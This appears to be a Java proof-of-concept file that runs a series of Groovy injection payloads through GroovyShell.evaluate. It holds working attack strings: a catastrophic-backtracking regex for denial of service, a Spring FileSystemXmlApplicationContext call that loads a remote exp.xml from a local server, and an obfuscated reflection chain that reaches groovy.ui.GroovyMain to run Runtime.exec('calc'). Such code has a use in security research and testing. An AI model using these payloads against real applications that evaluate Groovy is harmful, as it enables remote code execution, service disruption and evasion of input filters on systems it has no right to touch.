package org.example;

import groovy.lang.GroovyShell;

public class Main {
    public static void main(String[] args) throws Exception {
        safe();
//        test();
    }

    public static void safe() throws Exception {
        String cmd = "void doSomething(def param) {\n" +
                "    println \"In doSomething method, param: \" + param\n" +
                "}\n" +
                "def m = this.&doSomething\n" +
                "m(\"test param\");";

        cmd = "def m4 = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!'==~/(.*a){10000}/";
        cmd = "org.springframework.context.support.FileSystemXmlApplicationContext f " +
                "= new org.springframework.context.support.FileSystemXmlApplicationContext" +
                "(\"http://127.0.0.1:8001/exp.xml\")";
        cmd = "def c = Class\n" +
                "def f =c.&('forN'+'ame')\n" +
                "def clazz = f(\"groovy.ui.GroovyMain\")\n" +
                "def func = clazz.&main\n" +
                "func(new String[]{\"-e\", \"Runtime.getRuntime().exec(\\\"calc\\\")\"})";
        GroovyShell groovyShell = new GroovyShell();
        Object object = groovyShell.evaluate(cmd);
    }
    public static void test(){
        groovy.ui.GroovyMain.main(new String[]{"-e", "Runtime.getRuntime().exec(\"calc\")"});
    }
}